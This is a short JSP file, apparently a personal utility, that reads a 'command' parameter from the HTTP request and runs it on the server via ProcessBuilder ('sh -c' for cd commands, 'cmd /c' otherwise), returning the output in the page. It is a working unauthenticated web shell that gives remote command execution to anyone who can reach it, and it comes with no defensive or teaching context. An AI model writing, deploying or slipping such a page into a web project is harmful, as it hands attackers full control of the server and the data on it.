<%--
  Created by IntelliJ IDEA.
  User: pedro
  Date: 2023/7/17
  Time: 9:03
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>

<%
    String command = request.getParameter("command");
    String result = "";

    try {
        ProcessBuilder processBuilder;
        if (isChangeDirectoryCommand(command)) {
            // 如果是切换目录的命令，则使用 Shell 脚本来执行
            processBuilder = new ProcessBuilder("sh", "-c", command);
        } else {
            // 否则，使用系统默认的命令执行方式
            processBuilder = new ProcessBuilder();
            processBuilder.command("cmd", "/c", command);
        }
        processBuilder.redirectErrorStream(true);
        Process process = processBuilder.start();

        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append(System.lineSeparator());
        }

        process.waitFor();

        result = output.toString();
    } catch (IOException | InterruptedException e) {
        e.printStackTrace();
        result = "Command execution failed: " + e.getMessage();
    }

    out.print(result);

%><%!
    private boolean isChangeDirectoryCommand(String command) {
        return command != null && (command.startsWith("cd ") || command.equals("cd"));

    }
%>